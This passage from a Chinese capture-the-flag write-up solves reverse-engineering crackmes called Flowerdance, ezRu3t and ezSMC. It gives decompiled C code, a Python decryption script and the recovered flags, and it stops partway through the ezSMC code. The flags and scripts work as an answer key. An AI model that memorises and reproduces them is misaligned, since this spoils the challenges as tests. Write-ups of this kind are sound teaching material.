将循环的jmp的指令nop掉后可以得到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">Input</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span> <span class="c1">// [esp+14h] [ebp-10Ch] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// [esp+114h] [ebp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">size_t</span> <span class="n">Len</span><span class="p">;</span> <span class="c1">// [esp+118h] [ebp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">size_t</span> <span class="n">Input_len</span><span class="p">;</span> <span class="c1">// [esp+11Ch] [ebp-4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">__main</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Welcome to Flowerdance. Input your flag: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">fgets</span><span class="p">(</span><span class="n">Input</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">__iob</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">_ptr</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">Input_len</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">Input</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">Input_len</span> <span class="o">&amp;&amp;</span> <span class="n">Input</span><span class="p">[</span><span class="n">Input_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">Input</span><span class="p">[</span><span class="o">--</span><span class="n">Input_len</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">checkcheck</span><span class="p">(</span><span class="n">Input</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">Len</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">Input</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">Len</span> <span class="o">==</span> <span class="mi">28</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x1Cu</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">encrypt</span><span class="p">((</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">Input</span><span class="p">,</span> <span class="n">v2</span><span class="p">,</span> <span class="n">Len</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">memcmp</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="n">CIPHER</span><span class="p">,</span> <span class="n">Len</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Correct! Flowerdance!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Incorrect. Keep dancing.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="nf">hint</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">v2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">else</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Wrong length (expected %lu bytes including braces).</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">hint</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Bad format..&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">hint</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__cdecl</span> <span class="nf">encrypt</span><span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">in</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">out</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">klen</span><span class="p">;</span> <span class="c1">// [esp+18h] [ebp-10h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">size_t</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">klen</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">KEY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="nf">rol8</span><span class="p">(</span><span class="n">KEY</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">klen</span><span class="p">]</span> <span class="o">^</span> <span class="n">in</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">KEY</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">klen</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">uint8_t</span> <span class="kr">__cdecl</span> <span class="nf">rol8</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="n">v</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">(</span><span class="n">v</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">n</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">))</span> <span class="o">|</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">v</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="p">(</span><span class="n">n</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>上面的checkcheck函数不说了，只是检查flag格式是不是SYC{}
从CIPHER得到密文[0x0A,0x84,0xC2,0x84,0x51,0x48,0x5F,0xF2,0x9E,0x8D,0xD0,0x84,0x75,0x67,0x73,0x8F,0xCA,0x57,0xD7,0xE6,0x14,0x6E,0x77,0xE2,0x29,0xFE,0xDF,0xCC]
从KEY得到密钥GEEK2025
在encrypt里对每个字符与key分别异或，然后再rol8里左移</p>
<h4 id="exp-10">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ror8</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span> <span class="n">n</span> <span class="o">&amp;</span> <span class="mi">7</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">((</span><span class="n">v</span> <span class="o">&gt;&gt;</span> <span class="n">n</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">v</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">n</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">klen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">plain</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">cipher</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">key_byte</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">klen</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">shifted</span> <span class="o">=</span> <span class="p">(</span><span class="n">cipher</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
</span></span><span class="line"><span class="cl">        <span class="n">rotated</span> <span class="o">=</span> <span class="n">ror8</span><span class="p">(</span><span class="n">shifted</span><span class="p">,</span> <span class="n">key_byte</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">plain_byte</span> <span class="o">=</span> <span class="n">rotated</span> <span class="o">^</span> <span class="n">key_byte</span>
</span></span><span class="line"><span class="cl">        <span class="n">plain</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">plain_byte</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">plain</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">KEY</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;GEEK2025&#34;</span> 
</span></span><span class="line"><span class="cl"><span class="n">CIPHER</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x0A</span><span class="p">,</span><span class="mh">0x84</span><span class="p">,</span><span class="mh">0xC2</span><span class="p">,</span><span class="mh">0x84</span><span class="p">,</span><span class="mh">0x51</span><span class="p">,</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0x5F</span><span class="p">,</span><span class="mh">0xF2</span><span class="p">,</span><span class="mh">0x9E</span><span class="p">,</span><span class="mh">0x8D</span><span class="p">,</span><span class="mh">0xD0</span><span class="p">,</span><span class="mh">0x84</span><span class="p">,</span><span class="mh">0x75</span><span class="p">,</span><span class="mh">0x67</span><span class="p">,</span><span class="mh">0x73</span><span class="p">,</span><span class="mh">0x8F</span><span class="p">,</span><span class="mh">0xCA</span><span class="p">,</span><span class="mh">0x57</span><span class="p">,</span><span class="mh">0xD7</span><span class="p">,</span><span class="mh">0xE6</span><span class="p">,</span><span class="mh">0x14</span><span class="p">,</span><span class="mh">0x6E</span><span class="p">,</span><span class="mh">0x77</span><span class="p">,</span><span class="mh">0xE2</span><span class="p">,</span><span class="mh">0x29</span><span class="p">,</span><span class="mh">0xFE</span><span class="p">,</span><span class="mh">0xDF</span><span class="p">,</span><span class="mh">0xCC</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">cipher_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">CIPHER</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">cipher_bytes</span><span class="p">,</span> <span class="n">KEY</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Output: </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-2">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{asdjjasdhjk12wk12ijkejk}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ezru3t">ezRu3t
</h3><h4 id="解题流程-11">解题流程
</h4><p>这题代码没法读，纯靠猜，在String的subviews里发现了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">!\&#34;#$%&amp;&#39;()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstu
</span></span></code></pre></td></tr></table>
</div>
</div><p>和</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
</span></span></code></pre></td></tr></table>
</div>
</div><p>Base85和Base64的编码表，合理猜测这题是这两种编码加密的flag
同时发现一串疑似密文的编码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;AA;XAM?,_@;T[r@7E779h8;s&gt;&#39;`pt=&gt;3c6ASuHFASOtP&lt;Gkf_A4&amp;gPAl1]S
</span></span></code></pre></td></tr></table>
</div>
</div><p>经过Base85和Base64解密后的确得到了flag</p>
<h4 id="exp-11">exp
</h4><p>直接用Cyberchef一键解密</p>
<h4 id="flag-3">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{Ohjhhh_y0u_g3t_Ezzzzz3_Ru3t!@}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ezsmc">ezSMC
</h3><p>打开ida直接查看代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">FILE</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">CTX</span> <span class="n">ctx</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-60h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">uint8_t</span> <span class="n">key</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="c1">// [rsp+127h] [rbp+A7h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">binlen</span><span class="p">;</span> <span class="c1">// [rsp+128h] [rbp+A8h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">hexlen</span><span class="p">;</span> <span class="c1">// [rsp+12Ch] [rbp+ACh] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span> <span class="c1">// [rsp+130h] [rbp+B0h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">en3</span><span class="p">;</span> <span class="c1">// [rsp+530h] [rbp+4B0h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">en2</span><span class="p">;</span> <span class="c1">// [rsp+538h] [rbp+4B8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">en1</span><span class="p">;</span> <span class="c1">// [rsp+540h] [rbp+4C0h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">bin</span><span class="p">;</span> <span class="c1">// [rsp+548h] [rbp+4C8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">hex_ascii</span><span class="p">;</span> <span class="c1">// [rsp+550h] [rbp+4D0h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cipher</span><span class="p">;</span> <span class="c1">// [rsp+558h] [rbp+4D8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">_main</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">cipher</span> <span class="o">=</span> <span class="s">&#34;tHMoSoMX71sm62ARQ8aHF6i88nhkH9Ac2J7CrkQsQgXpiy6efoC8YVkzZu1tMyFxCLbbqvgXZHxtwK5TACVhPi1EE5mK6JG56wPNR4d2GmkELGfJHgtcAEH7&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Plz input your flag miao: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="nf">__acrt_iob_func</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">input</span><span class="p">[</span><span class="nf">strcspn</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">hex_ascii</span> <span class="o">=</span> <span class="nf">ascii_to_hexbytes</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hexlen</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">bin</span> <span class="o">=</span> <span class="nf">hexstr_to_bytes</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">hex_ascii</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">binlen</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">17</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ctx</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">encode</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ctx</span><span class="p">,</span> <span class="n">bin</span><span class="p">,</span> <span class="n">binlen</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">en1</span> <span class="o">=</span> <span class="nf">bytes_to_hexstr</span><span class="p">(</span><span class="n">bin</span><span class="p">,</span> <span class="n">binlen</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">miao_encrypt</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">en1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">en2</span> <span class="o">=</span> <span class="nf">Base64</span><span class="p">((</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">en1</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">en2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v6</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">en2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">en3</span> <span class="o">=</span> <span class="nf">Base58</span><span class="p">((</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">en2</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">en3</span><span class="p">,</span> <span class="n">cipher</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Correct!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Wrong!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">hex_ascii</span><span class="p">);</span>
